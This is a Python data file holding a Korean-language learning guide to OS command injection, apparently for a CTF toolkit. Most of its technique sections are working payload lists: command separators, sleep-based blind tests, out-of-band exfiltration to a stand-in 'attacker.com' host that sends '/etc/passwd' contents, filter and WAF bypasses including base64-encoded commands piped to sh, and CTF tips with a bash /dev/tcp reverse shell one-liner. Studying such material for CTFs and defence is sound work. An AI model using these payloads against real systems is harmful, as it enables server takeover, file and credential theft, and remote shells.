"""Command Injection (CMDi) Learning Guide."""

CMDI_GUIDE = {
    "attack_type": "cmdi",
    "title": "OS Command Injection Guide",
    "severity": "critical",
    "difficulty": "intermediate",

    "overview": """OS Command Injection은 애플리케이션이 사용자 입력을 시스템 명령에 포함시킬 때 발생합니다.
공격자는 명령 구분자(;, |, &, &&, ||)를 이용해 임의의 시스템 명령을 실행할 수 있습니다.

이 취약점은 서버를 완전히 장악할 수 있어 매우 위험합니다.
ping, nslookup, 파일 변환, 이메일 발송 등 시스템 명령을 호출하는 기능에서 주로 발견됩니다.""",

    "impact": [
        "원격 코드 실행 (RCE)",
        "서버 완전 장악",
        "데이터 탈취 및 삭제",
        "다른 시스템으로의 피벗",
        "백도어 설치",
        "랜섬웨어 배포",
    ],

    "vulnerable_patterns": [
        "os.system('ping ' + user_input)",
        "exec('nslookup ' . $_GET['host']);",
        "Runtime.getRuntime().exec(\"dig \" + domain);",
    ],

    "techniques": {
        "basic": {
            "name": "Basic Command Injection",
            "difficulty": "beginner",
            "how_it_works": """기본적인 명령 삽입은 명령 구분자를 사용하여 원래 명령 뒤에 추가 명령을 실행합니다.
세미콜론(;), 파이프(|), AND(&&), OR(||) 등의 구분자를 시도합니다.""",
            "prerequisites": [
                "사용자 입력이 시스템 명령에 직접 포함됨",
                "명령 구분자가 필터링되지 않음",
            ],
            "payloads": [
                {"payload": "; id", "purpose": "세미콜론으로 명령 추가", "expected": "uid=xxx 출력"},
                {"payload": "| id", "purpose": "파이프로 명령 실행", "expected": "uid=xxx 출력"},
                {"payload": "& id", "purpose": "백그라운드 실행 후 명령", "expected": "uid=xxx 출력"},
                {"payload": "&& id", "purpose": "이전 명령 성공 시 실행", "expected": "uid=xxx 출력"},
                {"payload": "|| id", "purpose": "이전 명령 실패 시 실행", "expected": "uid=xxx 출력"},
                {"payload": "`id`", "purpose": "백틱으로 명령 치환", "expected": "uid=xxx 출력"},
                {"payload": "$(id)", "purpose": "달러 괄호로 명령 치환", "expected": "uid=xxx 출력"},
            ],
            "detection_patterns": [
                "uid=, gid= 문자열 출력",
                "명령 결과가 응답에 포함됨",
                "응답 시간/내용 변화",
            ],
            "common_mistakes": [
                "하나의 구분자만 시도 - 모든 구분자 테스트 필요",
                "에러 메시지만 확인 - Blind 기법도 시도",
            ],
        },

        "blind_time": {
            "name": "Time-Based Blind CMDi",
            "difficulty": "intermediate",
            "how_it_works": """명령 실행 결과가 응답에 출력되지 않을 때, sleep이나 ping으로 시간 지연을 유발합니다.
지연 시간의 차이로 명령 실행 여부를 판단합니다.""",
            "prerequisites": [
                "시간 기반 판단이 가능해야 함",
                "sleep, ping 등 지연 명령 사용 가능",
            ],
            "payloads": [
                {"payload": "; sleep 5", "purpose": "Linux 지연", "expected": "5초 지연"},
                {"payload": "| ping -c 5 127.0.0.1", "purpose": "Linux ping 지연", "expected": "5초 지연"},
                {"payload": "& ping -n 5 127.0.0.1", "purpose": "Windows ping 지연", "expected": "5초 지연"},
                {"payload": "| timeout 5", "purpose": "Windows timeout", "expected": "5초 지연"},
            ],
            "detection_patterns": [
                "응답 시간이 설정한 시간만큼 증가",
                "일관된 지연 패턴",
            ],
            "common_mistakes": [
                "네트워크 지연과 혼동 - 여러 번 테스트",
            ],
        },

        "blind_oob": {
            "name": "Out-of-Band CMDi",
            "difficulty": "advanced",
            "how_it_works": """응답에서 결과를 확인할 수 없을 때, 외부 서버로 데이터를 전송합니다.
DNS 쿼리, HTTP 요청 등을 통해 데이터를 추출합니다.""",
            "prerequisites": [
                "서버에서 외부 네트워크 접근 가능",
                "curl, wget, nslookup 등 사용 가능",
            ],
            "payloads": [
                {"payload": "; curl http://attacker.com/$(whoami)", "purpose": "HTTP로 데이터 전송", "expected": "공격자 서버에 요청 수신"},
                {"payload": "| nslookup $(whoami).attacker.com", "purpose": "DNS로 데이터 전송", "expected": "DNS 쿼리 수신"},
                {"payload": "; wget http://attacker.com/?data=$(cat /etc/passwd|base64)", "purpose": "파일 내용 전송", "expected": "base64 인코딩된 데이터 수신"},
            ],
            "detection_patterns": [
                "외부 서버에서 요청 수신",
                "DNS 쿼리에 데이터 포함",
            ],
            "common_mistakes": [
                "방화벽이 외부 접근 차단 - DNS만 허용될 수 있음",
            ],
        },

        "filter_bypass": {
            "name": "Filter Bypass Techniques",
            "difficulty": "advanced",
            "how_it_works": """명령이나 문자가 필터링될 때 다양한 우회 기법을 사용합니다.
인코딩, 변수 치환, 와일드카드 등을 활용합니다.""",
            "prerequisites": [
                "필터링 규칙 파악",
            ],
            "payloads": [
                {"payload": ";{cat,/etc/passwd}", "purpose": "중괄호로 공백 대체", "expected": "passwd 내용"},
                {"payload": ";cat$IFS/etc/passwd", "purpose": "$IFS로 공백 대체", "expected": "passwd 내용"},
                {"payload": ";c'a't /etc/passwd", "purpose": "따옴표로 문자열 분리", "expected": "passwd 내용"},
                {"payload": ";c\"a\"t /etc/passwd", "purpose": "더블쿼트로 분리", "expected": "passwd 내용"},
                {"payload": ";/???/??t /???/p??s??", "purpose": "와일드카드 사용", "expected": "passwd 내용"},
                {"payload": ";$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)", "purpose": "base64 디코딩", "expected": "passwd 내용"},
            ],
            "detection_patterns": [
                "우회 기법으로 명령 실행 성공",
                "필터링 우회 후 정상 출력",
            ],
            "common_mistakes": [
                "한 가지 우회만 시도 - 여러 기법 조합",
            ],
        },
    },

    "checklist": [
        {
            "step": 1,
            "action": "시스템 명령 호출 가능성 파악",
            "expected_result": "ping, nslookup, 파일 처리 등 기능 식별",
            "command_example": "ctf-toolkit recon --url http://target.com",
            "notes": "도메인 조회, IP 입력, 파일 변환 기능 확인"
        },
        {
            "step": 2,
            "action": "기본 명령 구분자 테스트",
            "expected_result": "명령 실행 여부 확인",
            "command_example": "ctf-toolkit cmdi scan -u 'http://target.com?host=127.0.0.1'",
            "notes": ";, |, &, &&, ||, `, $() 모두 시도"
        },
        {
            "step": 3,
            "action": "Blind CMDi 테스트",
            "expected_result": "시간 지연 또는 외부 요청 확인",
            "command_example": None,
            "notes": "sleep, ping으로 시간 지연, curl/wget으로 OOB"
        },
        {
            "step": 4,
            "action": "필터링 확인 및 우회",
            "expected_result": "차단되는 문자/명령 파악",
            "command_example": None,
            "notes": "공백, 특수문자, 명령어 필터링 확인"
        },
        {
            "step": 5,
            "action": "OS 및 권한 확인",
            "expected_result": "Linux/Windows, 사용자 권한 파악",
            "command_example": None,
            "notes": "whoami, id, hostname 실행"
        },
        {
            "step": 6,
            "action": "RCE 증명 (리버스 쉘)",
            "expected_result": "원격 쉘 획득",
            "command_example": None,
            "notes": "nc, bash, python 리버스 쉘 시도"
        },
    ],

    "detection_patterns": [
        {
            "pattern_type": "behavior",
            "indicator": "uid=, gid= 문자열 응답에 포함",
            "confidence": "high",
            "db_specific": None,
            "example_response": "uid=33(www-data) gid=33(www-data)"
        },
        {
            "pattern_type": "behavior",
            "indicator": "root:x:0:0 (passwd 파일 내용)",
            "confidence": "high",
            "db_specific": None,
            "example_response": "root:x:0:0:root:/root:/bin/bash"
        },
        {
            "pattern_type": "timing",
            "indicator": "sleep 명령 시 지연 발생",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
        {
            "pattern_type": "behavior",
            "indicator": "외부 서버에 요청 수신",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
    ],

    "waf_bypass": [
        {
            "technique": "공백 대체 ($IFS)",
            "example": "cat$IFS/etc/passwd",
            "effective_against": "Space filters"
        },
        {
            "technique": "중괄호 확장",
            "example": "{cat,/etc/passwd}",
            "effective_against": "Space filters"
        },
        {
            "technique": "따옴표 삽입",
            "example": "c'a't /etc/passwd",
            "effective_against": "Command blacklists"
        },
        {
            "technique": "변수 사용",
            "example": "a=cat;b=/etc/passwd;$a $b",
            "effective_against": "Direct command filters"
        },
        {
            "technique": "Base64 인코딩",
            "example": "echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
            "effective_against": "Keyword filters"
        },
    ],

    "ctf_tips": [
        "; id 또는 | id 로 빠르게 테스트",
        "에러만 나오면 sleep 5로 Blind 테스트",
        "curl/wget으로 리버스 쉘 스크립트 다운로드 후 실행",
        "리버스 쉘: bash -i >& /dev/tcp/IP/PORT 0>&1",
        "Python 리버스 쉘: python -c 'import socket...'",
        "Windows: powershell -e [base64]",
        "방화벽 우회: DNS 터널링 또는 ICMP 터널링",
        "명령어 필터링 시 which, type으로 경로 확인 후 절대경로 사용",
    ],
}
